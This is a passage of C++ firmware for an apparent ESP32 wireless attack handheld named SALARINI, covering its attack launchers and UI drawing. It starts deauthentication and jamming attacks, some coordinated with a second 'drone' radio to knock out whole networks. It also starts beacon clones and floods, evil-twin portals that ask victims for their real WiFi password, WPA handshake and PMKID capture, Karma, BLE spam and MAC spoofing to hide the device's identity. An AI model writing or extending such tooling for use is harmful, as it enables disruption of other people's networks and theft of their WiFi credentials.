      etDuoJam=true;
      etPendingMode=1; etPendingApIdx=apIdx; etTemplate=0;
      buildTemplateList(); listTop=0;
      transitionTo(PORTAL_PICK);
      return;
    }
    std::vector<ae::TargetAP> targets;
    ae::TargetAP t;
    memcpy(t.bssid,b,6);
    strncpy(t.ssid,aps[apIdx].ssid.c_str(),32);
    t.channel=aps[apIdx].channel;
    t.encrypted=aps[apIdx].encrypted;
    t.rssi=aps[apIdx].rssi;
    if(mode==10){
      // DUO CROSSFIRE: both radios hammer the same BSSID at once.
      targets.push_back(t);
      drone::jobBegin(); drone::jobAdd(t.channel,t.bssid); drone::jobRun(rate);
      drone::setAuto(true);              // V24: auto link + job mirror for auto re-link
      dualHookSkip=true;   // this DUO attack already drives the drone by hand
      ae::attackStart(ae::AttackType::DEAUTH_SELECTED,"DUO CROSSFIRE",sanitizeSSID(aps[apIdx].ssid,20).c_str(),targets);
      dualHookSkip=false;
      actionReturnScreen=DRONE;
      transitionTo(ATTACK_LIVE);
      showPopup("DUO CROSSFIRE","2 RADIOS ON TARGET","DRONE JAM + LOCAL JAM");
      return;
    }
    if(mode==11){
      // DUO PINCER: this board takes the 2.4 GHz BSSIDs of the SSID, the
      // drone takes the 5 GHz family (dual-band full coverage).
      std::vector<ae::TargetAP> local,remote;
      for(size_t i=0;i<apCount;i++){
        if(aps[i].ssid!=aps[apIdx].ssid) continue;
        uint8_t bb[6]; apParseBSSID(aps[i].bssid,bb);
        ae::TargetAP x; memcpy(x.bssid,bb,6);
        strncpy(x.ssid,aps[i].ssid.c_str(),32);
        x.channel=aps[i].channel; x.encrypted=aps[i].encrypted; x.rssi=aps[i].rssi;
        if(aps[i].channel<=14) local.push_back(x); else remote.push_back(x);
      }
      if(local.empty()) local.push_back(t);
      if(remote.empty()) remote.push_back(t);   // single band: both radios join it
      drone::jobBegin();
      for(size_t i=0;i<remote.size();i++) drone::jobAdd(remote[i].channel,remote[i].bssid);
      drone::jobRun(rate);
      drone::setAuto(true);              // V24: auto link + job mirror for auto re-link
      dualHookSkip=true;   // this DUO attack already drives the drone by hand
      ae::attackStart(ae::AttackType::DEAUTH_SELECTED,"DUO PINCER 2.4G",sanitizeSSID(aps[apIdx].ssid,20).c_str(),local);
      dualHookSkip=false;
      actionReturnScreen=DRONE;
      transitionTo(ATTACK_LIVE);
      showPopup("DUO PINCER",String((unsigned)local.size())+"x2.4 HERE / "+String((unsigned)remote.size())+"x5G DRONE","DUAL BAND PRESSURE");
      return;
    }
    if(mode==14){
      // V24 DUO BEACON CLONE: this radio beacons the SSID while the drone jams
      // the REAL family AND beacons a clone of the same SSID on a remote
      // channel (first 5 GHz family channel if any, else a neighbour 2.4 GHz
      // channel) with the victim's security mirrored. The network name floods
      // every nearby list from two radios - the classic single-radio beacon
      // dup now covers both bands at once.
      std::vector<ae::TargetAP> fam;
      uint8_t bcCh=(t.channel==6)?11:6;
      for(size_t i=0;i<apCount;i++){
        if(aps[i].ssid!=aps[apIdx].ssid) continue;
        uint8_t bb[6]; apParseBSSID(aps[i].bssid,bb);
        ae::TargetAP x; memcpy(x.bssid,bb,6);
        strncpy(x.ssid,aps[i].ssid.c_str(),32);
        x.channel=aps[i].channel; x.encrypted=aps[i].encrypted; x.rssi=aps[i].rssi;
        fam.push_back(x);
        if(aps[i].channel>14) bcCh=aps[i].channel;   // prefer a 5 GHz clone slot
      }
      if(fam.empty()) fam.push_back(t);
      drone::jobBegin();
      uint8_t pushed=0;
      for(size_t i=0;i<fam.size() && pushed<8;i++){ drone::jobAdd(fam[i].channel,fam[i].bssid); pushed++; }
      drone::beaconStart(bcCh,aps[apIdx].ssid.c_str(),aps[apIdx].encrypted);
      drone::setAuto(true);              // V24: auto link + job mirror for auto re-link
      dualHookSkip=true;                 // this DUO attack drives the drone by hand
      ae::attackStart(ae::AttackType::BEACON_DUP_SELECTED,"DUO BEACON CLONE",sanitizeSSID(aps[apIdx].ssid,20).c_str(),fam);
      dualHookSkip=false;
      actionReturnScreen=DRONE;
      transitionTo(ATTACK_LIVE);
      showPopup("DUO BEACON CLONE",String((unsigned)fam.size())+" BSSIDS JAMMED","CLONE BEACON CH "+String(bcCh));
      return;
    }
    // mode 12 - DUO HANDSHAKE: the drone jams, this radio stays a full-time
    // EAPOL sniffer: faster and far more reliable captures.
    targets.push_back(t);
    drone::jobBegin(); drone::jobAdd(t.channel,t.bssid); drone::jobRun(rate);
    drone::setAuto(true);                // V24: auto link + job mirror for auto re-link
    dualHookSkip=true;     // this DUO attack already drives the drone by hand
    ae::attackStart(ae::AttackType::HS_CAPTURE,"DUO HANDSHAKE",sanitizeSSID(aps[apIdx].ssid,20).c_str(),targets);
    dualHookSkip=false;
    hsPopupShown=false;
    actionReturnScreen=DRONE;
    transitionTo(ATTACK_LIVE);
    showPopup("DUO HANDSHAKE","DRONE JAMS - WE SNIFF","EAPOL CAPTURE LIVE");
    return;
  }
  if(mode==8){
    // Keyboard Page: type the portal message, then launch.
    etPendingMode=8;
    etPendingApIdx=apIdx;
    etTemplate=6;
    keyboardPurpose=KEY_ET_MSG;keyboardBuffer="";keyboardSymbols=false;keyboardUpper=false;
    keyboardCancelTo=MEGA_PICK;
    transitionTo(WIFI_KEYBOARD);
    return;
  }
  stopMonitor();
  syncEngineAPs();
  std::vector<ae::TargetAP> targets;
  ae::TargetAP t;
  memcpy(t.bssid,b,6);
  strncpy(t.ssid,aps[apIdx].ssid.c_str(),32);
  t.channel=aps[apIdx].channel;
  t.encrypted=aps[apIdx].encrypted;
  t.rssi=aps[apIdx].rssi;
  targets.push_back(t);
  if(mode==3){
    ae::attackStart(ae::AttackType::HS_CAPTURE,"HANDSHAKE CAPTURE",sanitizeSSID(aps[apIdx].ssid,20).c_str(),targets);
    hsPopupShown=false;
    actionReturnScreen=COMBO;
    transitionTo(ATTACK_LIVE);
  }else if(mode==4){
    ae::attackStart(ae::AttackType::PMKID_GRAB,"PMKID GRAB",sanitizeSSID(aps[apIdx].ssid,20).c_str(),targets);
    hsPopupShown=false;
    actionReturnScreen=COMBO;
    transitionTo(ATTACK_LIVE);
  }else if(mode==5){
    ae::attackStart(ae::AttackType::CLIENT_HUNT,"CLIENT HUNTER",sanitizeSSID(aps[apIdx].ssid,20).c_str(),targets);
    actionReturnScreen=COMBO;
    transitionTo(ATTACK_LIVE);
  }
}
// V20/V21: called from the PORTAL_PICK screen after the user taps a template
// (or from the keyboard after typing). V21 adds the replicate password
// prompt and the keyboard-page message step before the launch.
static void launchPendingEvilTwin(){
  if(etPendingApIdx>=apCount){ showPopup("EVIL TWIN","TARGET LOST","RESCAN AND RETRY"); return; }
  if(etDuoJam || dualModeOn){    // V23.2: dual mode forces the drone on EVERY evil twin
    etDuoJam=false;                    // consumed either way
    if(!droneEnsureForAttack()) return;
  }
  if(etPendingMode==7 && !etRealAsked && !etRealSkipped){
    // Replicate internet: offer to type the REAL WiFi password now.
    etRealAsked=true;
    keyboardPurpose=KEY_ET_PASS;keyboardBuffer="";keyboardSymbols=false;keyboardUpper=false;
    keyboardCancelTo=PORTAL_PICK;
    transitionTo(WIFI_KEYBOARD);
    return;
  }
  if(etPendingMode==8 && etKeyMsg.length()==0){
    keyboardPurpose=KEY_ET_MSG;keyboardBuffer="";keyboardSymbols=false;keyboardUpper=false;
    keyboardCancelTo=MEGA_PICK;
    transitionTo(WIFI_KEYBOARD);
    return;
  }
  uint8_t b[6]; apParseBSSID(aps[etPendingApIdx].bssid,b);
  uint8_t mode=etPendingMode; etPendingMode=0;
  etRealSkipped=false;
  startEvilTwin(mode,b,aps[etPendingApIdx].ssid.c_str(),aps[etPendingApIdx].channel);
}

static void launchPrefixBeacon(){
  keyboardPurpose=KEY_ATTACK_TEXT;
  keyboardBuffer="";keyboardSymbols=false;keyboardUpper=false;
  attackTextDone=[](const String &txt){
    ae::setBeaconPrefix(txt);
    String lbl="PREFIX: "+txt;
    ae::attackStart(ae::AttackType::BEACON_PREFIX,"BEACON PREFIX",lbl.c_str());
    actionReturnScreen=EXPLOIT;
    transitionTo(ATTACK_LIVE);
  };
  transitionTo(WIFI_KEYBOARD);
}

static void launchBLE(ble::Mode m){
  stopMonitor();
  // V24.1: the drone link is TX/RX UART - no BLE radio conflict, so B.T ADV
  // and a linked drone can run at the same time.
  if(!ble::bleLibraryAvailable()){showPopup("B.T ADV","NIMBLE MISSING","INSTALL NIMBLE-ARDUINO");return;}
  if(!ble::start(m)){showPopup("B.T ADV","BLE INIT FAILED","CHECK SERIAL LOG");return;}
  sBLECarrierActive=true;
  sBLECarrierTitle="BLE ADV SPAM";
  sBLECarrierTarget=ble::modeNameOfActive();
  sBLECarrierStart=millis();
  attackLiveLastDrawMs=0;
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

static void stopBLECarrier(){
  if(!sBLECarrierActive)return;
  sBLECarrierActive=false;
  ble::stop();
}

static void launchTotalOutage(){
  stopMonitor();
  syncEngineAPs();
  std::vector<ae::TargetAP> targets;
  for(size_t i=0;i<apCount && i<MAX_APS;i++){
    uint8_t b[6]; apParseBSSID(aps[i].bssid,b);
    ae::TargetAP t;
    memcpy(t.bssid,b,6);
    strncpy(t.ssid,aps[i].ssid.c_str(),32);
    t.channel=aps[i].channel; t.encrypted=aps[i].encrypted; t.rssi=aps[i].rssi;
    targets.push_back(t);
  }
  if(!ble::bleLibraryAvailable()){showPopup("TOTAL OUTAGE","NIMBLE MISSING","INSTALL NIMBLE-ARDUINO");return;}
  if(!ble::start(ble::Mode::RANDOM)){showPopup("TOTAL OUTAGE","BLE INIT FAILED","CHECK SERIAL LOG");return;}
  ae::attackStart(ae::AttackType::TOTAL_OUTAGE,"TOTAL OUTAGE",
    String(String((unsigned)targets.size())+" APS + BLE").c_str(),targets);
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

static void launchStorm(){
  stopMonitor();
  syncEngineAPs();
  ae::attackStart(ae::AttackType::DEAUTH_STORM,"DEAUTH STORM (HOP)",
    String(String((unsigned)ae::knownAPCount())+" APS / HOP").c_str());
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

static void launchDeauthRickroll(){
  stopMonitor();
  syncEngineAPs();
  std::vector<ae::TargetAP> targets;
  for(size_t i=0;i<apCount && i<MAX_APS;i++){
    uint8_t b[6]; apParseBSSID(aps[i].bssid,b);
    ae::TargetAP t;
    memcpy(t.bssid,b,6);
    strncpy(t.ssid,aps[i].ssid.c_str(),32);
    t.channel=aps[i].channel; t.encrypted=aps[i].encrypted;
    targets.push_back(t);
  }
  ae::attackStart(ae::AttackType::DEAUTH_RICKROLL,"DEAUTH + RICKROLL",
    String(String((unsigned)targets.size())+" APS + MEME").c_str(),targets);
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

static void launchSimpleBeacon(ae::AttackType type,const char* title){
  stopMonitor();
  syncEngineAPs();
  std::vector<ae::TargetAP> targets;
  for(size_t i=0;i<apCount && i<MAX_APS;i++){
    uint8_t b[6]; apParseBSSID(aps[i].bssid,b);
    ae::TargetAP t;
    memcpy(t.bssid,b,6);
    strncpy(t.ssid,aps[i].ssid.c_str(),32);
    t.channel=aps[i].channel; t.encrypted=aps[i].encrypted;
    targets.push_back(t);
  }
  if(type==ae::AttackType::BEACON_DUP_ALL && targets.empty()){showPopup(title,"NO TARGETS","RUN A SCAN FIRST");return;}
  String lbl=(type==ae::AttackType::BEACON_DUP_ALL)?(String((unsigned)targets.size())+" SSIDS"):String("RANDOM SSIDS");
  ae::attackStart(type,title,lbl.c_str(),targets);
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

static void launchKarma(){
  stopMonitor();
  ae::karmaStart();
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

// ---- V18 launchers: new attack families ---------------------------------
static void launchTwoWayDeauth(){
  stopMonitor();
  if(wifiScanInProgress){cancelScan();}
  syncEngineAPs();
  std::vector<ae::TargetAP> targets;
  for(size_t i=0;i<apCount && i<MAX_APS;i++){
    uint8_t b[6]; apParseBSSID(aps[i].bssid,b);
    ae::TargetAP t;
    memcpy(t.bssid,b,6);
    strncpy(t.ssid,aps[i].ssid.c_str(),32);
    t.channel=aps[i].channel; t.encrypted=aps[i].encrypted; t.rssi=aps[i].rssi;
    targets.push_back(t);
  }
  if(targets.empty()){showPopup("2-WAY DEAUTH","NO TARGETS","RUN A SCAN FIRST");return;}
  ae::sortTargetsByRSSI(targets);   // closest networks first
  ae::attackStart(ae::AttackType::DEAUTH_TWO_WAY,"DEAUTH 2-WAY (WIDS)",
    String(String((unsigned)targets.size())+" APS").c_str(),targets);
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

static void launchProbeFlood(){
  stopMonitor();
  ae::attackStart(ae::AttackType::PROBE_FLOOD,"PROBE REPLY FLOOD","ALL SCANNERS NEARBY");
  actionReturnScreen=EXPLOIT;
  transitionTo(ATTACK_LIVE);
}

// ---- V26 MAC SPOOF: the board's own identity ------------------------------
// Randomize or restore the STA MAC. Logs, AP client lists and band
// "device counts" then show a different device every run. The radio must be
// stopped for esp_wifi_set_mac, so the guard refuses while anything that
// owns the radio is live (attack, evil twin, scan, monitor, BLE).
static uint8_t sOrigMac[6]={0};
static bool sOrigMacValid=false;
static bool macBusy(){
  return ae::attackRunning()||ae::karmaActive()||etActive||wifiScanInProgress||
         ae::staScanActive()||sBLECarrierActive||lan::active();
}
static void macStoreOriginal(){
  if(sOrigMacValid)return;
  if(esp_wifi_get_mac(WIFI_IF_STA,sOrigMac)==ESP_OK) sOrigMacValid=true;
}
static void macApply(const uint8_t* m){
  esp_wifi_stop();
  esp_err_t rc=esp_wifi_set_mac(WIFI_IF_STA,m);
  esp_wifi_start();
  WiFi.setSleep(false);
  ae::unleashTx();                       // stop/start resets the TX power
  if(rc==ESP_OK) Serial.printf("[MAC] new STA MAC %02X:%02X:%02X:%02X:%02X:%02X\n",
    m[0],m[1],m[2],m[3],m[4],m[5]);
  else Serial.printf("[MAC] set_mac rc=%d\n",(int)rc);
}
static void macRandomize(){
  if(macBusy()){showPopup("MAC SPOOF","BUSY NOW","STOP ATTACK / SCAN FIRST");return;}
  macStoreOriginal();
  uint8_t m[6];
  for(int i=0;i<6;i++) m[i]=(uint8_t)random(0,256);
  m[0]=(uint8_t)((m[0]&0xFC)|0x02);      // unicast + locally administered
  macApply(m);
  char id[18];
  snprintf(id,sizeof(id),"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
  showPopup("MAC SPOOF","NEW IDENTITY",String(id),2200);
}
static void macRestore(){
  if(macBusy()){showPopup("MAC RESTORE","BUSY NOW","STOP ATTACK / SCAN FIRST");return;}
  if(!sOrigMacValid){showPopup("MAC RESTORE","NO SAVED MAC","ORIGINAL IS STILL LIVE");return;}
  macApply(sOrigMac);
  char id[18];
  snprintf(id,sizeof(id),"%02X:%02X:%02X:%02X:%02X:%02X",sOrigMac[0],sOrigMac[1],sOrigMac[2],sOrigMac[3],sOrigMac[4],sOrigMac[5]);
  showPopup("MAC RESTORE","ORIGINAL IDENTITY",String(id),2200);
}

static void launchClientHunter(){
  stopMonitor();
  syncEngineAPs();
  etPickMode=5;
  pendingActionReturn=COMBO;
  pendingTargetAction=true;pendingTargetActionTitle="PICK TARGET AP";
  wifiConnectMode=false;
  if(apCount>0){listTop=0;transitionTo(AP_RESULTS);return;}
  beginScanAPs();
}

// ---- IN-NET (post-connection LAN attacks) --------------------------------
static void launchLan(lan::Mode m){
  if(WiFi.status()!=WL_CONNECTED){
    showPopup("IN-NET ATTACK","NOT CONNECTED","JOIN A WIFI FIRST");
    return;
  }
  stopMonitor();
  ae::attackStop(); stopBLECarrier();
  lan::clearScanDone();
  if(!lan::start(m)){showPopup("IN-NET ATTACK","START FAILED","CHECK CONNECTION");return;}
  actionReturnScreen=IN_NET;
  attackLiveLastDrawMs=0;
  transitionTo(ATTACK_LIVE);
}

static void startWifiConnection(const String &ssid,const String &password);
static void beginConnectWifiScan();
static void serviceWifiConnection();
static void drawConnectWifi();
static void drawWifiKeyboard();
static void drawWifiConnecting();
static void handleKeyboardTap(uint16_t x,uint16_t y);

// ---- Wi-Fi connection flow + screen transitions ----
// Restored from SALARINI V15 (these bodies were dropped during the merge,
// which produced "undefined reference" linker errors).
static bool speakerEnsureReady();
static void drawUnavailable(const String &title,const String &line1,const String &line2);

static void beginConnectWifiScan(){
  pendingTargetAction=false;pendingTargetActionTitle="";
  wifiConnectMode=true;
  scanThenSelect=false;
  beginScanAPs();
}

static void startWifiConnection(const String &ssid,const String &password){
  wifiTargetSSID=ssid; wifiPassword=password;
  if(wifiTargetSSID.length()==0){showPopup("CONNECT WIFI","SSID REQUIRED","ENTER A NETWORK NAME",1800);return;}
  WiFi.mode(WIFI_STA); WiFi.setSleep(false);
  WiFi.disconnect(false,false);
  delay(15);
  WiFi.begin(wifiTargetSSID.c_str(),wifiPassword.c_str());
  wifiConnectStartedMs=millis();wifiConnectLastDrawMs=0;wifiConnectAnimPhase=0;
  screen=WIFI_CONNECTING;menuIndex=0;listTop=0;popup=false;
  drawWifiConnecting();lcdPush(fb);
}

static void serviceWifiConnection(){
  if(screen!=WIFI_CONNECTING)return;
  uint32_t now=millis();
  if(WiFi.status()==WL_CONNECTED){
    wifiConnectMode=false;
    transitionTo(CONNECT_WIFI);
    showPopup("WIFI CONNECTED",WiFi.localIP().toString(),sanitizeSSID(WiFi.SSID(),30),2400);
    return;
  }
  if(now-wifiConnectStartedMs>25000){
    WiFi.disconnect(false,false);
    transitionTo(CONNECT_WIFI);
    showPopup("WIFI", "CONNECTION FAILED", "CHECK PASSWORD / SIGNAL",2400);
    return;
  }
  if(now-wifiConnectLastDrawMs>=100){
    wifiConnectLastDrawMs=now;wifiConnectAnimPhase++;
    drawWifiConnecting();lcdPush(fb);
  }
}

// ---------------------------- Transitions ---------------------------
static void transitionTo(Screen next){
  if(screen==PACKET && next!=PACKET)stopMonitor();
  if(next==MAIN){wifiConnectMode=false;homeAnimEpochMs=millis();homeAnimLastFrameMs=millis();pendingTargetAction=false;pendingTargetActionTitle="";}
  if(next!=SCAN_BUSY && visualScanActive) visualScanActive=false;
  screen=next;
  if(next==AUDIO_PAGE)speakerEnsureReady();
  if(next!=SCAN_BUSY)scanBaseDrawn=false;
  menuIndex=0;
  listTop=0;
  popup=false;
  drawCurrent();
  lcdPush(fb);
}

static void showPopup(const String &t,const String &a,const String &b,uint32_t ms){
  popup=true; popupUntil=millis()+ms;
  // Truncate at a single choke point so no popup text can ever overflow.
  popupTitle=sanitizeSSID(t,24); popup1=sanitizeSSID(a,24); popup2=sanitizeSSID(b,38);
  drawUnavailable(popupTitle,popup1,popup2); lcdPush(fb);
}
static void closePopup(){popup=false;drawCurrent();lcdPush(fb);}

// ------------------------------ Actions ------------------------------
static void openConnectWifiEntry(){
  pendingTargetAction=false;pendingTargetActionTitle="";
  wifiConnectMode=true;
  if(apCount>0){listTop=0;transitionTo(AP_RESULTS);}
  else beginConnectWifiScan();
}

static size_t screenCount(){
  switch(screen){
    case MAIN:return 6; case EXPLOIT:return 7; case DEAUTH:return 9; case DEAUTH_APS:return 3;
    case AUTH:return 3; case ASSOC:return 3; case BEACON:return 7; case SPOOF:return 5;
    case COMBO:return 9; case BT_ADV:return 9; case IN_NET:return 7; case MEGA_PICK:return 3;
    case DRONE:return 9;
    case LAN_HOSTS:return lan::hostCount();
    case HELP:return HELP_TOPIC_COUNT;
    case AP_RESULTS: case AP_SELECT:return apCount;
    case STA_RESULTS: case STA_SELECT:return ae::staCount();
    case SD_FILES:return sdFileCount; case PORTAL_PICK:return etTmplCount; default:return 0;
  }
}
static bool listScreen(){ return screen==EXPLOIT||screen==DEAUTH||screen==DEAUTH_APS||screen==AUTH||screen==ASSOC||screen==BEACON||screen==SPOOF||screen==COMBO||screen==BT_ADV||screen==HELP||screen==AP_RESULTS||screen==AP_SELECT||screen==STA_RESULTS||screen==STA_SELECT||screen==SD_FILES||screen==IN_NET||screen==LAN_HOSTS||screen==PORTAL_PICK||screen==MEGA_PICK||screen==DRONE; }

static void clearFB(){
  if(!fb)return;
  // A uniform dark canvas avoids the thin color seam under the SALARINI header.
  // Accents are drawn on cards and icons only, so page transitions look clean.
  std::fill(fb,fb+(size_t)TFT_W*TFT_H,BLACK);
}
static void header(const String &title){
  activeHeaderTitle=title;
  fillRectFB(0,0,TFT_W,48,BLACK,fb);
  fillCircleFB(7,23,3,CYAN,fb);
  const uint8_t scale=(title.length()<=10)?2:1;
  const int chars=(198-16)/(8*scale);
  drawTextFB(16,(scale==2)?13:18,title,WHITE,scale,fb,chars);
  // Native-style status capsule: percentage, then a compact battery glyph.
  drawPillFB(210,8,52,30,surfaceColor(25),DGRAY,fb);
  String pct=batPercent<0?"--%":String(batPercent)+"%";
  drawTextFB(217,18,pct,batCharging?GREEN:WHITE,1,fb,5);
  roundedCardFB(271,14,30,15,5,GRAY,surfaceColor(18),fb);
  fillRoundRectFB(302,18,3,7,2,GRAY,fb);
  const int p=constrain(batPercent,0,100);
  // 26x11 inner cavity: 100% fills it edge-to-edge without covering the case.
  const int fillW=(26*p+50)/100;
  if(fillW>0)fillRoundRectFB(273,16,fillW,11,2,batCharging?GREEN:CYAN,fb);
}
static void footer(bool back){
  fillRoundRectFB(8,434,304,38,14,surfaceColor(17),fb);
  roundedCardFB(8,434,304,38,14,DGRAY,surfaceColor(17),fb);
  const char* pl=(ae::powerLevel()==ae::Power::PWR_LOW)?"PWR LOW":((ae::powerLevel()==ae::Power::PWR_MAX)?"PWR MAX":"PWR MED");
  bool confirmMode=(screen==AP_SELECT && pendingSelectAttack!=ae::AttackType::NONE)
                 ||(screen==STA_SELECT && staSelectConfirm);
  if(back){
    if(confirmMode){
      drawPillFB(14,440,86,26,surfaceColor(27),DGRAY,fb);
      drawPillFB(108,440,86,26,surfaceColor(27),DGRAY,fb);
      drawPillFB(202,440,102,26,mix565(surfaceColor(10),GREEN,45),DGRAY,fb);
      drawTextFB(35,448,"BACK",WHITE,1,fb,8);
      drawTextFB(129,448,"HOME",WHITE,1,fb,8);
      drawTextFB(220,448,"CONFIRM",GREEN,1,fb,12);
    }else{
      drawPillFB(14,440,102,26,surfaceColor(27),DGRAY,fb);
      drawPillFB(132,440,102,26,surfaceColor(27),DGRAY,fb);
      drawTextFB(35,448,"BACK",WHITE,1,fb,8);
      drawTextFB(153,448,"HOME",WHITE,1,fb,8);
      drawTextFB(246,448,pl,CYAN,1,fb,7);
    }
  }else{
    fillCircleFB(26,453,3,GREEN,fb);
    drawTextFB(36,448,"READY",GRAY,1,fb,8);
    drawTextFB(137,448,"SALARINI",WHITE,1,fb,8);
    drawTextFB(246,448,pl,CYAN,1,fb,7);
  }
}
// V25: right-edge scrollbar for every scrollable list (menus, AP/STA lists,
// help, portal pages, LAN hosts, SD files). 4 px wide, sits in the black
// margin right of the 312-px-wide cards - never touches the rows.
static void drawScrollbarV(int top,int bottom,size_t count,int maxRows,int topIdx){
  if((int)count<=maxRows || maxRows<=0 || bottom<=top) return;
  int h=bottom-top;
  fillRoundRectFB(315,top,4,h,2,surfaceColor(10),fb);
  int th=max(18,(h*maxRows)/(int)count);
  int span=(int)count-maxRows;
  int ty=top;
  if(span>0) ty=top+(h-th)*topIdx/span;
  if(ty+th>bottom) ty=bottom-th;
  fillRoundRectFB(315,ty,4,th,2,CYAN,fb);
}

static void drawMenuPage(const char* const *items,size_t count,const String &title){
  clearFB();header(title);
  // V25: slim scrollbar on the far right for every list that overflows -
  // "que pueda bajar abajo" needs a visible affordance, not a hidden gesture.
  // (thumb drawn after the rows so it always sits on top)
  if(screen==DRONE){
    // V23: live drone link strip replaces the generic caption. V23.2: DUAL state.
    // V24: linked strip shows parsed telemetry (mode / channel / frames per
    // second / chip temperature) instead of the raw STAT dump.
    const bool lk=drone::linked();
    const char* dl1=lk?(dualModeOn?"DRONE LINKED - DUAL MODE ON":"DRONE LINKED - SX-DRONE READY")
                      :(drone::probing()?"DRONE PROBING PINS...":(dualModeOn?"DRONE OFFLINE - DUAL MODE ON":"DRONE OFFLINE - CHECK 3 WIRES + GND"));
    drawTextFB(16,47,dl1,lk?GREEN:(dualModeOn?YELLOW:GRAY),1,fb,37);
    String st;
    if(lk){
      String m=drone::statMode();
      st=(m.length()>0)?(m+" CH"+drone::statCh()+" "+drone::statRps()+"F/S "+drone::statTemp()+"C")
                       :String("WAITING FOR STATUS...");
    }else{
      // V24.2 wiring diagnostic, V25 twist: while the AUTO-PIN sweep runs the
      // live probe pair is shown; bytes with no link still point at baud/power.
      if(drone::probing()) st=String("AUTO-PIN SCAN TX")+String(drone::probeTxPin())+" RX"+String(drone::probeRxPin())+" ...";
      else st=String("RX ")+String((unsigned long)drone::rxBytes())+" B HEARD - CHECK 3 WIRES";
    }
    if(st.length()>44)st=st.substring(0,44);
    drawTextFB(16,61,st,lk?CYAN:GRAY,1,fb,37);
  } else {
    drawTextFB(16,53,"CHOOSE A MODULE",GRAY,1,fb,24);
    if(count>1) drawTextFB(232,53,String((unsigned)count)+" ITEMS",GRAY,1,fb,10);
  }
  const int top=71,rowH=48,maxRows=7;
  if(count==0){drawCenteredFB(200,"NO ITEMS",YELLOW,2,fb);footer();return;}
  if(menuIndex>=count)menuIndex=0;
  // V27 SCROLL ROOT FIX ("que sea como el menu de wifi"): these two clamps
  // used to run on EVERY repaint, dragging listTop back to the cursor row.
  // A swipe only moves listTop - the cursor never moves - so the very next
  // paint snapped every attack menu back to row 0 and scrolling felt dead,
  // while the WiFi AP list (no cursor, bottom-clamp only) scrolled fine.
  // Now the view follows the cursor ONLY when the cursor itself moved
  // (screen entry / row tap). A repaint caused by a swipe keeps listTop,
  // exactly like the WiFi list has always behaved.
  {
    static uint8_t sCurLast=0xFF, sScrLast=0xFF;   // 0xFF = never painted yet
    const uint8_t scr=(uint8_t)screen;
    if(menuIndex!=sCurLast || scr!=sScrLast){
      if(menuIndex<listTop)listTop=menuIndex;
      if(menuIndex>=listTop+maxRows)listTop=menuIndex-maxRows+1;
      sCurLast=menuIndex; sScrLast=scr;
    }
  }
  if(count<=maxRows)listTop=0;
  for(int r=0;r<maxRows;r++){
    size_t i=listTop+r;if(i>=count)break;int y=top+r*rowH;
    // Touch menus execute on tap; a default selected row only adds a blue
    // stripe that looks like a focus bug. Keep every item visually neutral.
    roundedCardFB(10,y,300,42,11,DGRAY,surfaceColor(14),fb);
    drawTextFB(21,y+14,(i<9?String("0")+String(i+1):String(i+1)),GRAY,1,fb,2);
    drawTextFB(53,y+13,String(items[i]),mix565(WHITE,GRAY,28),1,fb,29);
    drawTextFB(290,y+14,">",GRAY,1,fb,1);
  }
  drawScrollbarV(top,top+maxRows*rowH,count,maxRows,(int)listTop);
  // V28: the PAGE UP / PAGE DOWN pills are GONE (user request - "esos dos
  // botones molestan"). V27 made swipe scrolling work on every menu, so the
  // pills were redundant chrome; the scrollbar stays as the only indicator.
  footer();
}

static void drawMainTile(int x,int y,int w,int h,const String &label,const String &sub,uint8_t iconType){
  uint16_t fill=surfaceColor(18);
  roundedCardFB(x,y,w,h,11,DGRAY,fill,fb);
  fillRoundRectFB(x+7,y+7,31,h-14,9,mix565(BLACK,CYAN,25),fb);
  int cx=x+22,cy=y+h/2;
  if(iconType==0){
    drawCircleFB(cx,cy,8,CYAN,fb);drawCircleFB(cx,cy,3,WHITE,fb);
    drawLineFB(cx-10,cy-10,cx-5,cy-5,CYAN,fb);drawLineFB(cx+5,cy+5,cx+10,cy+10,CYAN,fb);
    drawLineFB(cx-10,cy+10,cx-5,cy+5,CYAN,fb);drawLineFB(cx+5,cy-5,cx+10,cy-10,CYAN,fb);
  }else if(iconType==1){
    drawCircleFB(cx,cy,9,CYAN,fb);drawCircleFB(cx,cy,5,DGRAY,fb);fillCircleFB(cx,cy,2,GREEN,fb);
    drawLineFB(cx,cy,cx+7,cy-6,CYAN,fb);
  }else if(iconType==2){
    drawLineFB(cx-10,cy-4,cx,cy+4,CYAN,fb);drawLineFB(cx+10,cy-4,cx,cy+4,CYAN,fb);
    drawLineFB(cx-6,cy+1,cx,cy+7,CYAN,fb);drawLineFB(cx+6,cy+1,cx,cy+7,CYAN,fb);fillCircleFB(cx,cy+10,2,WHITE,fb);
  }else if(iconType==3){
    drawLineFB(cx-10,cy+6,cx-5,cy+1,CYAN,fb);drawLineFB(cx-5,cy+1,cx,cy+4,CYAN,fb);
    drawLineFB(cx,cy+4,cx+4,cy-7,GREEN,fb);drawLineFB(cx+4,cy-7,cx+10,cy-1,CYAN,fb);
  }else if(iconType==4){
    drawCircleFB(cx,cy,8,CYAN,fb);drawCircleFB(cx,cy,3,DGRAY,fb);
    for(int i=0;i<8;i++){float a=i*0.785398f;drawLineFB(cx+(int)(7*cosf(a)),cy+(int)(7*sinf(a)),cx+(int)(11*cosf(a)),cy+(int)(11*sinf(a)),CYAN,fb);}
  }else{
    drawCircleFB(cx,cy,9,CYAN,fb);drawLineFB(cx,cy-3,cx,cy+5,WHITE,fb);fillCircleFB(cx,cy-6,1,WHITE,fb);
  }
  drawTextFB(x+45,y+8,label,WHITE,1,fb,15);
  drawTextFB(x+45,y+25,sub,GRAY,1,fb,15);
  drawTextFB(x+w-13,y+17,">",CYAN,1,fb,1);
}

static void drawMainDashboard(){
  clearFB();header("SALARINI");
  drawTextFB(17,53,"YOUR CONTROL CENTER",GRAY,1,fb,25);
  drawHomeSkull(0);
  roundedCardFB(20,228,280,22,11,DGRAY,surfaceColor(20),fb);
  fillCircleFB(32,239,3,WiFi.status()==WL_CONNECTED?GREEN:CYAN,fb);
